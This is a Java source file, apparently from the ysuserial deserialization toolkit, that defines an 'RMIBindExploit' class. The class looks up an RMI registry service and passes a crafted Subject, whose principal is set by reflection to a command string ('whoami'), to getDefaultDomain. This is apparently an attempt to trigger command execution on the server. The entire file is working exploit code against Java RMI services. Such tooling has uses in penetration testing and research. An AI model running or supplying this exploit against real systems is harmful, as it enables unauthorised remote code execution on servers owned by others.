package org.su18.ysuserial.exploit;

import com.sun.security.auth.UnixPrincipal;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.management.remote.rmi.RMIConnection;
import javax.security.auth.Subject;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

/**
 * @author su18
 */
public class RMIBindExploit {

	public static void main(String[] args) throws Exception {

		String host         = "127.0.0.1";
		int    registryPort = 1100;
		String command      = "whoami";
		String serviceName  = "su18";


		Registry registry = LocateRegistry.getRegistry(host, registryPort);
		System.out.println(Arrays.toString(registry.list()));
		Subject subject = new Subject();

		Set set = new HashSet();
		set.add(new UnixPrincipal(command));
		Reflections.setFieldValue(subject, "principals", set);

		System.out.println(((RMIConnection) registry.lookup(serviceName)).getDefaultDomain(subject));
	}

}
